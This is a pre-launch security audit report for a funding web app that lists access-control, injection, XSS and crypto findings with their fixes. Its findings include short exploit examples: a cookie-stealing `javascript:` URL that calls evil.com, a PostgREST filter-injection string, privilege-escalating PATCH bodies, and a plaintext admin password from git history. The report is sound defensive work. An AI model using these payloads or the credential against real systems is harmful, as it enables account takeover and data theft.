# Pre-Launch Security Audit — MyFundingList

**Date:** 2026-08-11
**Status:** RESOLVED — all findings fixed and merged to `main` in commit `c5dd97f`, then re-audited with 6 additional fixes in commit range `ba731e5..136f868` (see [Post-fix verification](#post-fix-verification-re-audit) below).
**Scope:** Full static code review across 15 requested risk categories, run as 7 independent deep-dive passes over every API route, middleware, dependency tree, and git history.
**Method:** Each pass read full file contents (not just grep matches) across all 34 API route handlers under `src/app/api/**`, `src/middleware.ts`, shared `src/lib/**` helpers, `next.config.ts`, dependency manifests, and git history back to the repo's first commit.
**Scope limits:** This is a static code review, not a live penetration test — no requests were sent against a running instance, and no dynamic scanning, fuzzing, or load testing was performed. Findings describe what the code permits, not confirmation each exploit was executed against production.

## Original verdict: NOT READY TO LAUNCH

Do not go live until the 4 critical findings are fixed — in particular, every route under `/api/admin/*` currently accepts unauthenticated requests and can read, edit, or delete any user, investor, or withdrawal record.

**Totals:** 4 Critical · 7 High · 7 Medium · 4 Low/Informational · 9 areas verified clean

---

## Coverage against the 15 requested categories

| Category | Result | Findings |
|---|---|---|
| Remote Code Execution | Clean | — |
| SQL Injection | Medium | M1 |
| Broken Access Control | Critical | C1, H2, H3, H4 |
| Cross Site Scripting | Medium | M2, L1 |
| Security Misconfig → verbose error | Medium (error bodies themselves clean) | M3, M7 |
| Cryptographic Failures | Critical | C2, H5, M4 |
| Server-Side Request Forgery | Clean | — |
| Broken Object Level Authorization | Critical | C1, H2, H3 |
| Rate Limiting | Critical | C4, H7 |
| Shadow & Zombie APIs | High | H1 |
| Software Supply Chain Compromise | Critical | C2, C3 |
| CI/CD Pipeline Attacks | Medium | M5 |
| Memory Corruption | Low/Info | L4 (DoS note at M6) |
| Unit Testing | Gap | L3 |
| Integration Testing | Gap | L3 |

---

## Critical

### C1 — Every `/api/admin/*` route is unauthenticated and bypasses row-level security — ✅ FIXED (`14a671a`)
**Files:** `api/admin/investors/[id]/route.ts`, `api/admin/users/[id]/route.ts`, `api/admin/withdrawals/[id]/route.ts`, `api/admin/investors/route.ts`, `api/admin/users/route.ts`, `api/admin/withdrawals/route.ts`, `api/admin/affiliates/route.ts`, `api/admin/startups/route.ts`, `api/admin/excel/route.ts`, `api/admin/dashboard/route.ts`, `api/admin/dashboard/visualization/route.ts`

`middleware.ts` explicitly excludes `/api/*` from its auth check (comment: "api routes have their own protection"). None of these 11 routes check `getUser()` or role at all, and every one uses `createSupabaseAdminClient()`, which authenticates with the Supabase service-role key and bypasses row-level security entirely. The admin login page only sets a client-side `localStorage` flag, which nothing server-side ever reads.

**Exploit:** An anonymous `curl` request can `DELETE` any investor, `PATCH /api/admin/users/<uuid>` with `{"role":"admin","credits_allocated":999999}` to seize any account, dump every user's email/role/credit balance, and pull every withdrawal request including bank account and IFSC numbers.

**Fix applied:** Added a shared `requireAdmin()` helper (`src/lib/requireAdmin.ts`) that verifies session + `users.role === 'admin'` via the RLS-respecting client, called at the top of every handler in every route above. Also closed a related middleware gap where an unauthenticated visitor could fall through RULE 2 on admin pages.

### C2 — Hardcoded admin credential lived in git history for ~7 months — ✅ FIXED (`14a671a`)
**Files:** `api/admin/login/route.ts` · commits `be9c41c` (2025-11-25) → `ba7c64d` (2026-07-05)

`ADMIN_USERNAME`/`ADMIN_PASSWORD` shipped with a fallback default (`admin@mystartupinvestors.com` / `SecureAdmin2024!`) used whenever the env vars were unset. The "Secrets Fix" commit removed the fallback, but the plaintext credential is permanently readable in git history by anyone with repo access.

**Exploit:** Anyone who clones this repo can read the credential from `git show be9c41c`, regardless of current file state.

**Fix applied:** The entire static-credential login route was deleted; admin sign-in now goes through Supabase auth (`supabase.auth.signInWithPassword`) with a server-verified role check, same as the rest of the app. **Manual action still required:** rotate/remove `ADMIN_USERNAME`/`ADMIN_PASSWORD` from hosting provider env vars — the leaked password should be treated as compromised regardless of the code path being gone.

### C3 — 1 critical + 11 high-severity dependency vulnerabilities — ✅ MOSTLY FIXED (`4b1984a`)
**Packages:** `tar` (critical), `next@15.5.7` (high, fix: 15.5.23+), `xlsx` (high, prototype pollution + ReDoS, **no upstream fix available**), `brace-expansion`, `js-yaml`, `minimatch`, `nanoid`, `picomatch`, `postcss`, `sharp`, `ws`, `flatted`

`npm audit` reports these advisories. `xlsx` is used for admin bulk-import of investor data and has no fix on the npm registry copy.

**Fix applied:** `npm audit fix` + bumped `next` to 15.5.23. `tar` (critical) and most highs resolved. Remaining 4 highs (`postcss`, `sharp`, transitively via `next`, plus `xlsx`) require a `next` v16 major-version bump or replacing `xlsx` outright — both are breaking changes, deliberately deferred rather than rushed. `xlsx`'s residual risk is now bounded since it's only reachable behind the now-fixed admin auth (C1).

### C4 — No rate limiting exists anywhere in the app — ✅ FIXED (`69a07b9`, `26f58de`)
**Files:** `api/admin/login/route.ts`, `api/auth/signin/route.ts`, `api/create-checkout/route.ts`

Zero rate-limiting library or mechanism anywhere in the codebase or dependency tree. Most severe at `admin/login`, which does a plaintext `===` comparison against static credentials with no lockout, delay, or CAPTCHA.

**Exploit:** Credential-stuffing the admin login is unthrottled; so is flooding `create-checkout` against the payment provider.

**Fix applied:** Added `src/lib/rate-limit.ts` (in-process fixed-window limiter, since no external infra like Redis/Upstash was available) and wired it into `auth/signin`, `investors/[id]/unlock`, and `create-checkout`. The `admin/login` route itself was deleted (see C2), so its traffic now flows through `auth/signin`'s limits. Documented tradeoff: best-effort per-instance on serverless deployments, not globally accurate across instances.

---

## High

### H1 — Unused admin endpoint allows privilege escalation via arbitrary PATCH body — ✅ FIXED (`14a671a`)
**File:** `api/admin/users/[id]/route.ts`

The client function (`updateUser()` in `lib/api.ts`) is never called from any page — the admin user-list UI is read-only. The route is still live, takes no auth check, and does `supabase.from("users").update(body)` with the raw client body.

**Exploit:** `PATCH /api/admin/users/<id>` with `{"role":"admin"}` escalates any account.

**Fix applied:** Gated with `requireAdmin()` (part of the C1 fix) and restricted to an explicit field allowlist (`name`, `email`, `startup_form_submitted`) so `role`/credit fields can no longer be set via this endpoint at all.

### H2 — Any logged-in user can edit another user's startup submission — ✅ FIXED (`7f763e0`, `ba731e5`)
**File:** `api/startups/my/route.ts` (PUT)

Checks `getUser()`, but the update query targets `startup_leads` by a client-supplied `id` with no `.eq('user_id', user.id)` constraint.

**Exploit:** A logged-in attacker sends `{"id":"<victim's lead id>", ...}` and edits someone else's submission.

**Fix applied:** Added the ownership constraint. A second issue surfaced during re-audit and was fixed separately — see [Post-fix verification](#post-fix-verification-re-audit).

### H3 — Any user's payment record is readable by ID guessing — ✅ FIXED (`7f763e0`)
**File:** `api/transactions/[paymentId]/route.ts`

No `getUser()` call at all — trusts the path parameter alone.

**Exploit:** `GET /api/transactions/<any-payment-id>` returns amount, plan, status, and `user_id` for any account.

**Fix applied:** Added a session check and scoped the query to `.eq('user_id', user.id)`.

### H4 — Checkout creation trusts a client-supplied `user_id` — ✅ FIXED (`7f763e0`)
**Files:** `api/create-checkout/route.ts`, `api/webhooks/dodo/route.ts:48`

No session check on checkout creation; the request-body `user_id` flows into Dodo checkout metadata, and the webhook later credits that `user_id` unconditionally.

**Exploit:** A paying attacker sets `user_id` to any account to credit it instead of their own.

**Fix applied:** `user_id` is now derived solely from the authenticated session; the request body is never read for `user_id` at all.

### H5 — Affiliate referral codes use `Math.random()`, not a CSPRNG — ✅ FIXED (`97adb08`)
**File:** `api/affiliate/register/route.ts:5-11`

The 8-character referral code that gates a 25% commission on every referred payment is generated with `Math.random()`, which has no security guarantee against prediction.

**Fix applied:** Switched to `crypto.randomInt()`, which uses rejection sampling internally — no modulo bias.

### H6 — Credit deduction has a read-then-write race condition — ✅ FIXED (`ffa4b76`)
**File:** `api/calculations/use-credit/route.ts:143-193`

Credits are read, decremented in application code, then written back with no atomic guard or `WHERE credits > 0` condition.

**Exploit:** Concurrent requests from the same account can double-spend a credit or drive the balance negative.

**Fix applied:** Replaced with an optimistic-concurrency compare-and-swap (`.eq(column, previousValue).gt(column, 0)`), retried up to 3 times, with no new database migration required. Hand-traced and covered by `tests/api/use-credit-race.test.ts`.

### H7 — Investor database can be scraped via sequential unlock calls — ✅ FIXED (`69a07b9`)
**File:** `api/investors/[id]/unlock/route.ts`

The only usage control is a credit-balance check; no time-based throttle.

**Fix applied:** Added per-user rate limiting (10 requests/60s) ahead of the credit-balance check.

---

## Medium

### M1 — Unsanitized search parameter injected into PostgREST filter syntax — ✅ FIXED (`a9ff7c4`, `9136296`)
**Files:** `api/investors/route.ts:30-38`, `api/admin/investors/route.ts:12-19`, `api/admin/users/route.ts:12-14`

The `search` query param is spliced directly into a PostgREST `.or(...)` filter string with no escaping of `, . ( ) %`. All other queries use the parameterized Supabase builder — this is scoped to filter-logic manipulation, not arbitrary SQL.

**Exploit:** A payload like `x%),id.gt.0,(id.eq.0` injects additional OR-clauses, altering which rows match.

**Fix applied:** Added escaping of PostgREST special characters. A re-audit pass found the first version of this escaping was itself bypassable — see [Post-fix verification](#post-fix-verification-re-audit) for the corrected version.

### M2 — Stored `javascript:` URL XSS via CMS and founder-submitted links — ✅ FIXED (`a9ff7c4`, `1944710`)
**Files:** `blog/[slug]/BlogPostClient.tsx:100-112`, `StartupDetailsModal.tsx`, `InvestorDetailModal.tsx`, `view-startup/page.tsx`, `admin/user-list/page.tsx`

Sanity CMS link marks and founder-submitted LinkedIn/website fields are rendered as raw `href` with no scheme allowlist. Client-side `type="url"` hinting is not enforced server-side.

**Exploit:** A founder sets "Company Website" to `javascript:fetch('//evil.com?c='+document.cookie)`; an admin clicking it in the review UI executes attacker JS in the admin's session.

**Fix applied:** Added a shared `sanitizeHref()` utility (`src/lib/safe-url.ts`, URL-parser-based, `http`/`https`/`mailto` allowlist) applied at every href-rendering site. Re-audit found one missed site and a bypass in the utility itself, both fixed — see [Post-fix verification](#post-fix-verification-re-audit).

### M3 — No security headers configured — ✅ FIXED (`26f58de`)
**Files:** `next.config.ts`, `middleware.ts`

No CSP, `X-Frame-Options`, HSTS, `X-Content-Type-Options`, or `Referrer-Policy` anywhere. Admin panel and login pages can currently be framed by a third-party page (clickjacking).

**Fix applied:** Added `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and HSTS to `next.config.ts`, applied to all routes. CSP was deliberately not added without the ability to verify it against the app's live third-party integrations (Supabase, Sanity, Google OAuth, Dodo Payments).

### M4 — Admin login is an orphaned auth path that still accepts attempts — ✅ FIXED (`14a671a`)
**Files:** `api/admin/login/route.ts`, `app/admin/page.tsx:29`

Success only sets `localStorage.setItem("adminAuth", "true")` — never creates a real Supabase session, so it doesn't gate anything the real role-based middleware checks. Still live enough to burn credential-stuffing attempts; its 500-vs-401 response distinguishes "env vars unconfigured" from "wrong password."

**Fix applied:** Same as C2 — the route is gone; admin sign-in now uses real Supabase auth + role verification.

### M5 — No CI/CD pipeline exists — ✅ FIXED (`4b1984a`)
No `.github/workflows`, `vercel.json`, or equivalent found. Deployment appears to go straight from a git push to production with no automated dependency scan, test gate, or secret scan. The critical `tar` and high `next` CVEs (C3) would ship straight to production today.

**Fix applied:** Added `.github/workflows/ci.yml`, running on push/PR to `main`: install, `npm audit`, lint, `npm test`, build.

### M6 — No file-size limit on pitch-deck upload — ✅ FIXED (`26f58de`)
**File:** `api/startups/upload-deck/route.ts:23`

The full upload is buffered into memory (`Buffer.from(await file.arrayBuffer())`) before any size check — availability risk, not a memory-safety bug.

**Fix applied:** Added a 15MB size check before the file is buffered.

### M7 — Payment SDK errors are deep-serialized into server logs — ✅ FIXED (`7f763e0`)
**File:** `api/create-checkout/route.ts:92-95`

`JSON.stringify(err, Object.getOwnPropertyNames(err))` logs every property of the Dodo SDK error. Never reaches the client, but more verbose than needed in a payment context.

**Fix applied:** Trimmed to log `err.name`/`err.message` only.

---

## Low / Informational

### L1 — Missing `rel="noopener noreferrer"` on one external link — ✅ FIXED (`a9ff7c4`)
**File:** `InvestorDetailModal.tsx:89-95` — minor tabnabbing exposure, compounds M2 at this location.

### L2 — Unescaped slug in Sanity GROQ query — ✅ FIXED (`a9ff7c4`)
**File:** `lib/sanity.ts:149` — low impact, the Sanity dataset is read-only and publicly scoped. Now passed as a proper GROQ query parameter instead of string interpolation.

### L3 — No unit or integration tests, no CI test gate — ✅ FIXED (`4b1984a`)
No `*.test.*` files, no test runner config, no `test` script in `package.json`.

**Fix applied:** Added vitest with 4 tests covering exactly the priority list below (16 assertions total, all passing):
1. Webhook signature rejection test on `webhooks/dodo`
2. Concurrent credit-deduction test (`tests/api/use-credit-race.test.ts`)
3. Admin-route auth tests (`tests/api/admin-auth.test.ts`)
4. Affiliate commission calculation pinning tests

### L4 — Memory corruption is not a realistic risk for this stack — no action needed
Everything runs on managed V8/Node and browser runtimes. The one native dependency (`sharp`, transitive via Next's image optimizer) is never fed user-controlled input — `images.remotePatterns` is a tight two-host allowlist. `xlsx` parsing happens client-side only. No WASM anywhere. See M6 for the one related availability concern.

---

## Verified clean

- No RCE vector — no eval, exec, or dynamic require of user input anywhere
- No SSRF — no server-side fetch uses a user-controlled URL; tight image-host allowlist
- Dodo webhook signature verification is correctly implemented with constant-time comparison
- No hardcoded secrets in current source; `.env` never committed; no `NEXT_PUBLIC_` leak of server secrets
- No weak crypto algorithms in use (no MD5, SHA1, DES, ECB)
- `investors/*`, `affiliate/*` (except code randomness), `auth/*`, `calculations/*`, `user/*` all correctly session-scoped
- All 35 API routes return generic error messages — no stack traces or raw DB errors reach clients
- Lockfile committed, no malicious install-time scripts, no external CDN script tags, dependencies caret-pinned
- No other shadow/duplicate route confusion beyond the one zombie endpoint (H1)

---

## Post-fix verification (re-audit)

After the initial fix pass (commits `14a671a`..`4b1984a`), a second round of 5 independent verification passes re-checked every finding above against the actual merged code — not just that a change happened nearby, but that each fix closes the hole and doesn't introduce a new one. This caught 6 real issues the first pass missed, all fixed in commits `ba731e5`..`136f868` before merging to `main`:

1. **M1 was still bypassable.** The PostgREST escaping function never escaped a literal backslash in the input, so a payload with its own leading `\` could absorb the app's defensive escaping once PostgREST parsed the value, reconstituting the filter injection. Fixed by escaping `\` first, then the delimiter characters (`9136296`).
2. **`safe-url.ts` had a bypass of its own.** Protocol-relative URLs (`//evil.com`) were treated as schemeless and silently promoted to `https://evil.com` instead of being rejected — an open-redirect-shaped bug introduced by the M2 fix itself. Fixed by explicitly rejecting protocol-relative input (`1944710`).
3. **One `href` site was missed by the M2 sweep.** `StartupDetailsModal.tsx` rendered `deck_url` unsanitized while its other two links were correctly wrapped. Fixed (`1944710`).
4. **`startups/my` and `upload-deck` were checking auth on the wrong Supabase client.** Both called `.auth.getUser()` on the service-role admin client, which has no cookie/session context and can never resolve a real user — meaning the H2 ownership fix likely never ran for legitimate callers either. Fixed by using the cookie-aware server client to identify the caller, then the admin client for the privileged DB operation (`ba731e5`).
5. **`startups/my` PUT accepted an arbitrary client-supplied field name.** Even with the ownership check in place, a caller could set `field: "user_id"` to reassign a row to a different account. Fixed with an explicit editable-field allowlist matching the actual UI (`ba731e5`).
6. **`create-checkout`'s rate-limit key wasn't namespaced.** A bare `user.id` as the bucket key risked colliding with another route's key if one were ever added using the same pattern. Fixed by prefixing the key (`136f868`).

All 6 were re-verified with a full build, lint, `tsc --noEmit`, and test run before merging. Final state: 12 commits, all checks green, no regressions found in the completeness sweep (dangling references, broken imports, dead code, or duplicated business logic).

---

## Outstanding items (not code fixes)

- **Rotate/remove `ADMIN_USERNAME`/`ADMIN_PASSWORD`** from hosting provider env vars — the leaked historical credential (C2) should be treated as compromised regardless of the code path being removed.
- **`xlsx` has no upstream security fix** (C3) — accepted as residual risk since it's now behind the fixed admin auth. A real fix means replacing the library or accepting a `next` v16 major-version bump later.
- One pre-existing, unrelated bug noted during the re-audit but out of scope for this pass: `AddInvestorExcelModal.tsx` posts an array to `/api/admin/investors`, whose handler does `.insert(body).select().single()` (errors on multi-row insert). Worth its own ticket.
